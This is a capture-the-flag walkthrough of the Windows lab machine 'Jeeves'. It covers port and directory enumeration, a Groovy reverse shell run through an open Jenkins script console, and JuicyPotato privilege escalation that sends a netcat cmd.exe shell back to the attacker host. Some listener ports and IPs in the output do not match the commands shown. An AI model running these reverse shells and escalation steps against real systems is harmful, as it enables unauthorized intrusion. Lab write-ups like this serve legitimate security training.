## Intro

Tags: #linux #OSCPpath #jenkins #Impersonation  #medium  

--------
# Reconnaissance

## Port scan

```shell
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip
[sudo] password for emvee: 
Starting Nmap 7.94 ( https://nmap.org ) at 2026-11-22 20:22 CET
Nmap scan report for 10.129.228.112
Host is up (0.019s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone
Running (JUST GUESSING): Microsoft Windows 2008|Phone (87%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (87%), Microsoft Windows 8.1 Update 1 (85%), Microsoft Windows Phone 7.5 or 8.0 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 5h00m00s, deviation: 0s, median: 4h59m59s
| smb2-time: 
|   date: 2026-11-23T00:24:05
|_  start_date: 2026-11-23T00:21:29
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   19.13 ms 10.10.14.1
2   19.83 ms 10.129.228.112

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 149.60 seconds
```

## SMB enumeration

```shell
└─$ smbmap -H $ip -v

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 0 SMB session(s)                                

└─$ smbclient -L $ip
Password for [WORKGROUP\emvee]:
session setup failed: NT_STATUS_ACCESS_DENIED
```
nothing found via smbmap and smbclient

## WebApp

### Banner grabbing

lets find more info about port `80` and `50000`
```shell
└─$ whatweb http://$ip
http://10.129.228.112 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.129.228.112], Microsoft-IIS[10.0], Title[Ask Jeeves]

└─$ whatweb http://$ip:50000
http://10.129.228.112:50000 [404 Not Found] Country[RESERVED][ZZ], HTTPServer[Jetty(9.4.z-SNAPSHOT)], IP[10.129.228.112], Jetty[9.4.z-SNAPSHOT], PoweredBy[Jetty://], Title[Error 404 Not Found]
```
no usefull info here

## Directory enumeration

```shell
└─$ gobuster dir -u http://$ip:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.228.112:50000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/askjeeves            (Status: 302) [Size: 0] [--> http://10.129.228.112:50000/askjeeves/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```
interesting, an dir was discovered `/askjeeves`
navigating to `http://jeeves.htb:50000/askjeeves` goes here
![](MediaFiles/Pasted%20image%2020260927141616.png)
and on the bottom right we can see jenkins version `2.87`
lets keep the version in mind, but before searching exploits for it lets navigate more

-------
# Foothold
## Jenkins script console

went to `manage jenkins > script console`
inside the script console, execute this rev shell
```powershell
String host="10.10.14.247";
int port=3333;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
run it, got shell back

## Shell as kohsuke
```powershell
└─$ nc -lvnp 3333
listening on [any] 4321 ...
connect to [10.10.14.247] from (UNKNOWN) [10.129.228.112] 49676
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins>whoami
whoami
jeeves\kohsuke
C:\Users\kohsuke\Desktop>type user.txt
```
grabbed user flag

----
# Privesc

## Privileges

```powershell
C:\Users\Administrator\.jenkins>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

C:\Users\Administrator\.jenkins>
```

### SeImpersonatePrivilege

```powershell
└─$ cp /usr/share/windows-resources/binaries/nc.exe .
└─$ ll
-rw-r--r-- 1 emvee emvee  57344 Nov 22 21:55 god.exe
-rw-r--r-- 1 emvee emvee 347648 Nov 22 22:05 JuicyPotato.exe
-rwxr-xr-x 1 emvee emvee  59392 Nov 22 22:06 nc.exe
```

start local smb server
```powershell
└─$ sudo impacket-smbserver share $(pwd) -smb2support
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

create a new share on the target to transfer files through it
```powershell
C:\Users\kohsuke\Desktop>net use \\10.10.14.247\share
net use \\10.10.14.247\share
The command completed successfully.

C:\Users\kohsuke\Desktop>copy \\10.10.14.247\share\JuicyPotato.exe C:\Users\kohsuke\Desktop\JuicyPotato.exe
copy \\10.10.14.247\share\JuicyPotato.exe C:\Users\kohsuke\Desktop\JuicyPotato.exe
        1 file(s) copied.

C:\Users\kohsuke\Desktop>copy \\10.10.14.247\share\nc.exe C:\Users\kohsuke\Desktop\nc.exe
copy \\10.10.14.247\share\nc.exe C:\Users\kohsuke\Desktop\nc.exe
        1 file(s) copied.
```
now that the transfers are done, lets create a rev shell
```powershell
JuicyPotato.exe -l 1337 -t * -p C:\Windows\System32\cmd.exe -a "/c c:\users\kohsuke\desktop\nc.exe -e cmd.exe 10.10.14.247 3333"
```
start listener
```shell
nc -lvnp 3333
```
now run the juicypotato:
```powershell
C:\Users\kohsuke\Desktop>JuicyPotato.exe -l 1337 -t * -p C:\Windows\System32\cmd.exe -a "/c c:\users\kohsuke\desktop\nc.exe -e cmd.exe 10.10.14.103 9876"
JuicyPotato.exe -l 1337 -t * -p C:\Windows\System32\cmd.exe -a "/c c:\users\kohsuke\desktop\nc.exe -e cmd.exe 10.10.14.103 9876"
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```
received shell back!
```powershell
└─$ nc -lvnp 3333
listening on [any] 9876 ...
connect to [10.10.14.247] from (UNKNOWN) [10.129.228.112] 49690
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>hostname
hostname
Jeeves

C:\Windows\system32>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .htb
   IPv4 Address. . . . . . . . . . . : 10.129.228.112
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.129.0.1

Tunnel adapter isatap..htb:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : .htb

C:\Windows\system32>
```
lets go grab the flag
```powershell
C:\Windows\system32>cd c:\users\administrator\desktop\
cd c:\users\administrator\desktop\

c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of c:\Users\Administrator\Desktop

11/08/2017  09:05 AM    <DIR>          .
11/08/2017  09:05 AM    <DIR>          ..
12/24/2017  02:51 AM                36 hm.txt
11/08/2017  09:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,416,275,456 bytes free

c:\Users\Administrator\Desktop>type hm.txt
type hm.txt
The flag is elsewhere.  Look deeper.
c:\Users\Administrator\Desktop>
```
but why? lets find out
```powershell
c:\Users\Administrator\Desktop>dir /r
dir /r
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of c:\Users\Administrator\Desktop

11/08/2017  09:05 AM    <DIR>          .
11/08/2017  09:05 AM    <DIR>          ..
12/24/2017  02:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  09:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,416,189,440 bytes free
```
hm it seems we have an Alternate Data Stream (ADS) here, we can see `hm.txt:root.txt:$DATA` what means there is an Alternative Data Stream available. We can see the content with the following command: `more < hm.txt:root.txt`
```powershell
c:\Users\Administrator\Desktop>type hm.txt
type hm.txt
The flag is elsewhere.  Look deeper.
c:\Users\Administrator\Desktop>more < hm.txt:root.txt
more < hm.txt:root.txt
---HERE IS THE ROOT FLAG---

c:\Users\Administrator\Desktop>
```
now we have found the root flag finally!

------
# Summary

```
Reconnaissance  
↓  
Service Enumeration  
↓  
Jenkins Discovery  
↓  
Initial Foothold  
↓  
User Enumeration  
↓  
Local Enumeration  
↓  
Privilege Escalation Enumeration  
↓  
SeImpersonatePrivilege 
↓  
SYSTEM
```